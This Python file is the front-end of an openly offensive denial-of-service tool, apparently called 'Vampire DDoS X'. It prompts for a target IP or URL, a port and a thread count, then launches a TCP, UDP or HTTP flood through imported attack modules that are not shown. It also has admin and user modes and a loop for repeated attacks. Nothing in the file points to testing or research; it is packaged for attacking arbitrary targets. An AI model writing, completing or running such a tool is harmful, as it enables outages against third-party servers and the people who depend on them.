# vampire_ddos_x.py

import os
import sys
from core.banner import show_admin_banner, show_user_banner
from core.password import verify_admin_password
from core.utils import Color, clear_screen, slow_print
from attacks import tcp, udp, http

def choose_attack():
    print(f"\n{Color.CYAN}Select Attack Type:{Color.RESET}")
    print("[1] TCP Flood")
    print("[2] UDP Flood")
    print("[3] HTTP Flood")
    choice = input(f"{Color.YELLOW}>>> {Color.RESET}")
    return choice

def run_attack(choice):
    target = input(f"{Color.CYAN}Target IP or URL: {Color.RESET}")
    try:
        port = int(input(f"{Color.CYAN}Port (e.g., 80): {Color.RESET}"))
        threads = int(input(f"{Color.CYAN}Threads: {Color.RESET}"))
    except ValueError:
        print(f"{Color.RED}Invalid input! Port and Threads must be numbers.{Color.RESET}")
        return

    if choice == '1':
        tcp.attack(target, port, threads)
    elif choice == '2':
        udp.attack(target, port, threads)
    elif choice == '3':
        http.attack(target, port, threads)
    else:
        print(f"{Color.RED}Invalid choice!{Color.RESET}")

def admin_mode():
    clear_screen()
    show_admin_banner()
    while True:
        choice = choose_attack()
        run_attack(choice)
        again = input(f"\n{Color.YELLOW}Attack again? (y/n): {Color.RESET}").lower()
        if again != 'y':
            break

def user_mode():
    clear_screen()
    show_user_banner()
    while True:
        choice = choose_attack()
        run_attack(choice)
        again = input(f"\n{Color.YELLOW}Attack again? (y/n): {Color.RESET}").lower()
        if again != 'y':
            break

def main():
    clear_screen()
    slow_print(f"{Color.YELLOW}[!] Select mode:")
    print("[1] Admin Mode")
    print("[2] User Mode")
    mode = input(f"{Color.YELLOW}>>> {Color.RESET}")

    if mode == '1':
        if verify_admin_password():
            admin_mode()
        else:
            print(f"{Color.RED}Access Denied.{Color.RESET}")
    elif mode == '2':
        user_mode()
    else:
        print(f"{Color.RED}Invalid mode selection.{Color.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Attack aborted by user.{Color.RESET}")
